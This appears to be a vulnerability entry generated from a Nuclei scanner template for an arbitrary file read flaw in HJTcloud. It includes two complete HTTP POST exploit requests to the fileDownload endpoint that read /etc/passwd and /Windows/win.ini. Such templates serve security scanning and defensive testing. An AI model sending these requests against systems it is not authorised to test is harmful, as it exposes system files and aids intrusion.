# Nuclei Template: HJTcloud - Local File Inclusion
**Template ID:** hjtcloud-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`hjtcloud-arbitrary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
HJTcloud is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
POST /fileDownload?action=downloadBackupFile HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fullPath=/etc/passwd

POST /fileDownload?action=downloadBackupFile HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fullPath=/Windows/win.ini
```

## References
- https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
